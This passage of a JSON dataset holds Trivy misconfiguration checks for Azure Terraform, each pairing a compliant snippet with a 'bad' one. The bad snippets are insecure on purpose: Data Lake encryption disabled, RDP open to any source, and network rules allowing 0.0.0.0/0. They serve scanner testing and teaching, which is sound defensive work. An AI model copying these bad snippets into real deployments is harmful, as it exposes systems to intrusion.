            "bad": [
              "resource \"azurerm_data_lake_store\" \"bad_example\" {\n  encryption_state = \"Disabled\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-CONTENT_TYPE_FOR_SECRET",
        "title": "Content Type For Secret",
        "provider": "azure",
        "service": "keyvault",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type\n  good:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"good_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n        content_type = \"password\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"bad_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n      }\n",
        "file_name": "content_type_for_secret.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/content_type_for_secret.yaml",
        "local_path": "azure/keyvault/content_type_for_secret.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type"
            ],
            "good": [
              "resource \"azurerm_key_vault_secret\" \"good_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n  content_type = \"password\"\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_secret\" \"bad_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-ENSURE_KEY_EXPIRY",
        "title": "Ensure Key Expiry",
        "provider": "azure",
        "service": "keyvault",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date\n  good:\n    - |-\n      resource \"azurerm_key_vault_key\" \"good_example\" {\n        name            = \"generated-certificate\"\n        key_vault_id    = azurerm_key_vault.example.id\n        key_type        = \"RSA\"\n        key_size        = 2048\n        expiration_date = \"1982-12-31T00:00:00Z\"\n\n        key_opts = [\n          \"decrypt\",\n          \"encrypt\",\n          \"sign\",\n          \"unwrapKey\",\n          \"verify\",\n          \"wrapKey\",\n        ]\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_key\" \"bad_example\" {\n        name         = \"generated-certificate\"\n        key_vault_id = azurerm_key_vault.example.id\n        key_type     = \"RSA\"\n        key_size     = 2048\n\n        key_opts = [\n          \"decrypt\",\n          \"encrypt\",\n          \"sign\",\n          \"unwrapKey\",\n          \"verify\",\n          \"wrapKey\",\n        ]\n      }\n",
        "file_name": "ensure_key_expiry.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/ensure_key_expiry.yaml",
        "local_path": "azure/keyvault/ensure_key_expiry.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date"
            ],
            "good": [
              "resource \"azurerm_key_vault_key\" \"good_example\" {\n  name            = \"generated-certificate\"\n  key_vault_id    = azurerm_key_vault.example.id\n  key_type        = \"RSA\"\n  key_size        = 2048\n  expiration_date = \"1982-12-31T00:00:00Z\"\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_key\" \"bad_example\" {\n  name         = \"generated-certificate\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-ENSURE_SECRET_EXPIRY",
        "title": "Ensure Secret Expiry",
        "provider": "azure",
        "service": "keyvault",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date\n  good:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"good_example\" {\n        name            = \"secret-sauce\"\n        value           = \"szechuan\"\n        key_vault_id    = azurerm_key_vault.example.id\n        expiration_date = \"1982-12-31T00:00:00Z\"\n      }\n    - |-\n      resource \"azuread_application\" \"myapp\" {\n        display_name = \"MyAzureAD App\"\n\n        group_membership_claims = [\"ApplicationGroup\"]\n        prevent_duplicate_names = true\n\n      }\n\n      resource \"azuread_application_password\" \"myapp\" {\n        application_object_id = azuread_application.myapp.object_id\n        end_date              = \"2024-12-18T00:00:00Z\"\n      }\n\n      resource \"azurerm_key_vault_secret\" \"myapp_pass\" {\n        name            = \"myapp-oauth\"\n        value           = azuread_application_password.myapp.value\n        key_vault_id    = azurerm_key_vault.cluster_key_vault.id\n        expiration_date = azuread_application_password.myapp.end_date\n        content_type    = \"Password\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"bad_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n      }\n",
        "file_name": "ensure_secret_expiry.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/ensure_secret_expiry.yaml",
        "local_path": "azure/keyvault/ensure_secret_expiry.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date"
            ],
            "good": [
              "resource \"azurerm_key_vault_secret\" \"good_example\" {\n  name            = \"secret-sauce\"\n  value           = \"szechuan\"\n  key_vault_id    = azurerm_key_vault.example.id\n  expiration_date = \"1982-12-31T00:00:00Z\"\n}",
              "resource \"azuread_application\" \"myapp\" {\n  display_name = \"MyAzureAD App\"\n\n  group_membership_claims = [\"ApplicationGroup\"]\n  prevent_duplicate_names = true\n\n}\n\nresource \"azuread_application_password\" \"myapp\" {\n  application_object_id = azuread_application.myapp.object_id\n  end_date              = \"2024-12-18T00:00:00Z\"\n}\n\nresource \"azurerm_key_vault_secret\" \"myapp_pass\" {\n  name            = \"myapp-oauth\"\n  value           = azuread_application_password.myapp.value\n  key_vault_id    = azurerm_key_vault.cluster_key_vault.id\n  expiration_date = azuread_application_password.myapp.end_date\n  content_type    = \"Password\"\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_secret\" \"bad_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-NO_PURGE",
        "title": "No Purge",
        "provider": "azure",
        "service": "keyvault",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled\n  good:\n    - |-\n      resource \"azurerm_key_vault\" \"good_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        purge_protection_enabled    = false\n      }\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 2\n        purge_protection_enabled    = true\n      }\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 100\n        purge_protection_enabled    = true\n      }\n",
        "file_name": "no_purge.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/no_purge.yaml",
        "local_path": "azure/keyvault/no_purge.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled"
            ],
            "good": [
              "resource \"azurerm_key_vault\" \"good_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  purge_protection_enabled    = false\n}",
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 2\n  purge_protection_enabled    = true\n}",
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 100\n  purge_protection_enabled    = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-SPECIFY_NETWORK_ACL",
        "title": "Specify Network Acl",
        "provider": "azure",
        "service": "keyvault",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls\n  good:\n    - |-\n      resource \"azurerm_key_vault\" \"good_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.good_example.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = false\n\n        network_acls {\n          bypass         = \"AzureServices\"\n          default_action = \"Deny\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.bad_example.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = false\n      }\n",
        "file_name": "specify_network_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/specify_network_acl.yaml",
        "local_path": "azure/keyvault/specify_network_acl.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls"
            ],
            "good": [
              "resource \"azurerm_key_vault\" \"good_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.good_example.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = false\n\n  network_acls {\n    bypass         = \"AzureServices\"\n    default_action = \"Deny\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.bad_example.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-ACTIVITY_LOG_RETENTION_SET",
        "title": "Activity Log Retention Set",
        "provider": "azure",
        "service": "monitor",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"good_example\"\n\n        retention_policy {\n          enabled = true\n          days    = 365\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        retention_policy {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "activity_log_retention_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/activity_log_retention_set.yaml",
        "local_path": "azure/monitor/activity_log_retention_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"good_example\"\n\n  retention_policy {\n    enabled = true\n    days    = 365\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  retention_policy {\n    enabled = true\n  }\n}",
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-CAPTURE_ALL_ACTIVITIES",
        "title": "Capture All Activities",
        "provider": "azure",
        "service": "monitor",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"good_example\"\n\n        categories = [\n          \"Action\",\n          \"Delete\",\n          \"Write\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 365\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "capture_all_activities.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/capture_all_activities.yaml",
        "local_path": "azure/monitor/capture_all_activities.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"good_example\"\n\n  categories = [\n    \"Action\",\n    \"Delete\",\n    \"Write\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 365\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-CAPTURE_ALL_REGIONS",
        "title": "Capture All Regions",
        "provider": "azure",
        "service": "monitor",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        locations = [\n          \"eastus\",\n          \"eastus2\",\n          \"southcentralus\",\n          \"westus2\",\n          \"westus3\",\n          \"australiaeast\",\n          \"southeastasia\",\n          \"northeurope\",\n          \"swedencentral\",\n          \"uksouth\",\n          \"westeurope\",\n          \"centralus\",\n          \"northcentralus\",\n          \"westus\",\n          \"southafricanorth\",\n          \"centralindia\",\n          \"eastasia\",\n          \"japaneast\",\n          \"jioindiawest\",\n          \"koreacentral\",\n          \"canadacentral\",\n          \"francecentral\",\n          \"germanywestcentral\",\n          \"norwayeast\",\n          \"switzerlandnorth\",\n          \"uaenorth\",\n          \"brazilsouth\",\n          \"centralusstage\",\n          \"eastusstage\",\n          \"eastus2stage\",\n          \"northcentralusstage\",\n          \"southcentralusstage\",\n          \"westusstage\",\n          \"westus2stage\",\n          \"asia\",\n          \"asiapacific\",\n          \"australia\",\n          \"brazil\",\n          \"canada\",\n          \"europe\",\n          \"global\",\n          \"india\",\n          \"japan\",\n          \"uk\",\n          \"unitedstates\",\n          \"eastasiastage\",\n          \"southeastasiastage\",\n          \"centraluseuap\",\n          \"eastus2euap\",\n          \"westcentralus\",\n          \"southafricawest\",\n          \"australiacentral\",\n          \"australiacentral2\",\n          \"australiasoutheast\",\n          \"japanwest\",\n          \"jioindiacentral\",\n          \"koreasouth\",\n          \"southindia\",\n          \"westindia\",\n          \"canadaeast\",\n          \"francesouth\",\n          \"germanynorth\",\n          \"norwaywest\",\n          \"swedensouth\",\n          \"switzerlandwest\",\n          \"ukwest\",\n          \"uaecentral\",\n          \"brazilsoutheast\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        locations = [\n          \"westus\",\n          \"global\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "capture_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/capture_all_regions.yaml",
        "local_path": "azure/monitor/capture_all_regions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  locations = [\n    \"eastus\",\n    \"eastus2\",\n    \"southcentralus\",\n    \"westus2\",\n    \"westus3\",\n    \"australiaeast\",\n    \"southeastasia\",\n    \"northeurope\",\n    \"swedencentral\",\n    \"uksouth\",\n    \"westeurope\",\n    \"centralus\",\n    \"northcentralus\",\n    \"westus\",\n    \"southafricanorth\",\n    \"centralindia\",\n    \"eastasia\",\n    \"japaneast\",\n    \"jioindiawest\",\n    \"koreacentral\",\n    \"canadacentral\",\n    \"francecentral\",\n    \"germanywestcentral\",\n    \"norwayeast\",\n    \"switzerlandnorth\",\n    \"uaenorth\",\n    \"brazilsouth\",\n    \"centralusstage\",\n    \"eastusstage\",\n    \"eastus2stage\",\n    \"northcentralusstage\",\n    \"southcentralusstage\",\n    \"westusstage\",\n    \"westus2stage\",\n    \"asia\",\n    \"asiapacific\",\n    \"australia\",\n    \"brazil\",\n    \"canada\",\n    \"europe\",\n    \"global\",\n    \"india\",\n    \"japan\",\n    \"uk\",\n    \"unitedstates\",\n    \"eastasiastage\",\n    \"southeastasiastage\",\n    \"centraluseuap\",\n    \"eastus2euap\",\n    \"westcentralus\",\n    \"southafricawest\",\n    \"australiacentral\",\n    \"australiacentral2\",\n    \"australiasoutheast\",\n    \"japanwest\",\n    \"jioindiacentral\",\n    \"koreasouth\",\n    \"southindia\",\n    \"westindia\",\n    \"canadaeast\",\n    \"francesouth\",\n    \"germanynorth\",\n    \"norwaywest\",\n    \"swedensouth\",\n    \"switzerlandwest\",\n    \"ukwest\",\n    \"uaecentral\",\n    \"brazilsoutheast\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  locations = [\n    \"westus\",\n    \"global\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-DISABLE_RDP_FROM_INTERNET",
        "title": "Disable Rdp From Internet",
        "provider": "azure",
        "service": "network",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_ranges    = [\"3389\"]\n        source_address_prefix      = \"4.53.160.75\"\n        destination_address_prefix = \"*\"\n      }\n\n      resource \"azurerm_network_security_group\" \"example\" {\n        name                = \"tf-appsecuritygroup\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        security_rule {\n          source_port_range          = \"any\"\n          destination_port_ranges    = [\"3389\"]\n          source_address_prefix      = \"4.53.160.75\"\n          destination_address_prefix = \"*\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        name                       = \"bad_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_ranges    = [\"3389\"]\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n\n      resource \"azurerm_network_security_group\" \"example\" {\n        name                = \"tf-appsecuritygroup\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        security_rule {\n          source_port_range          = \"any\"\n          destination_port_ranges    = [\"3389\"]\n          source_address_prefix      = \"*\"\n          destination_address_prefix = \"*\"\n        }\n      }\n",
        "file_name": "disable_rdp_from_internet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/disable_rdp_from_internet.yaml",
        "local_path": "azure/network/disable_rdp_from_internet.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_ranges    = [\"3389\"]\n  source_address_prefix      = \"4.53.160.75\"\n  destination_address_prefix = \"*\"\n}\n\nresource \"azurerm_network_security_group\" \"example\" {\n  name                = \"tf-appsecuritygroup\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  security_rule {\n    source_port_range          = \"any\"\n    destination_port_ranges    = [\"3389\"]\n    source_address_prefix      = \"4.53.160.75\"\n    destination_address_prefix = \"*\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  name                       = \"bad_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_ranges    = [\"3389\"]\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}\n\nresource \"azurerm_network_security_group\" \"example\" {\n  name                = \"tf-appsecuritygroup\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  security_rule {\n    source_port_range          = \"any\"\n    destination_port_ranges    = [\"3389\"]\n    source_address_prefix      = \"*\"\n    destination_address_prefix = \"*\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-NO_PUBLIC_EGRESS",
        "title": "No Public Egress",
        "provider": "azure",
        "service": "network",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        direction                  = \"Outbound\"\n        destination_address_prefix = \"10.0.0.0/16\"\n        access                     = \"Allow\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        direction                  = \"Outbound\"\n        destination_address_prefix = \"0.0.0.0/0\"\n        access                     = \"Allow\"\n      }\n",
        "file_name": "no_public_egress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/no_public_egress.yaml",
        "local_path": "azure/network/no_public_egress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  direction                  = \"Outbound\"\n  destination_address_prefix = \"10.0.0.0/16\"\n  access                     = \"Allow\"\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  direction                  = \"Outbound\"\n  destination_address_prefix = \"0.0.0.0/0\"\n  access                     = \"Allow\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-NO_PUBLIC_INGRESS",
        "title": "No Public Ingress",
        "provider": "azure",
        "service": "network",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        direction                  = \"Inbound\"\n        destination_address_prefix = \"10.0.0.0/16\"\n        access                     = \"Allow\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"allow_lb_prober\" {\n        direction               = \"Inbound\"\n        access                  = \"Allow\"\n        protocol                = \"Tcp\" # Probes are always TCP\n        source_port_range       = \"*\"\n        destination_port_ranges = \"443\"\n        source_address_prefix   = \"168.63.129.16\" // single public IP (Azure well known)\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        direction             = \"Inbound\"\n        source_address_prefix = \"0.0.0.0/0\"\n        access                = \"Allow\"\n      }\n",
        "file_name": "no_public_ingress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/no_public_ingress.yaml",
        "local_path": "azure/network/no_public_ingress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  direction                  = \"Inbound\"\n  destination_address_prefix = \"10.0.0.0/16\"\n  access                     = \"Allow\"\n}",
              "resource \"azurerm_network_security_rule\" \"allow_lb_prober\" {\n  direction               = \"Inbound\"\n  access                  = \"Allow\"\n  protocol                = \"Tcp\" # Probes are always TCP\n  source_port_range       = \"*\"\n  destination_port_ranges = \"443\"\n  source_address_prefix   = \"168.63.129.16\" // single public IP (Azure well known)\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  direction             = \"Inbound\"\n  source_address_prefix = \"0.0.0.0/0\"\n  access                = \"Allow\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-RETENTION_POLICY_SET",
        "title": "Retention Policy Set",
        "provider": "azure",
        "service": "network",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy\n  good:\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n        network_watcher_name = \"good_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = true\n          days    = 90\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n        network_watcher_name = \"bad_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = false\n          days    = 7\n        }\n      }\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n        network_watcher_name = \"bad_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "retention_policy_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/retention_policy_set.yaml",
        "local_path": "azure/network/retention_policy_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy"
            ],
            "good": [
              "resource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n  network_watcher_name = \"good_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 90\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n  network_watcher_name = \"bad_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = false\n    days    = 7\n  }\n}",
              "resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n  network_watcher_name = \"bad_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
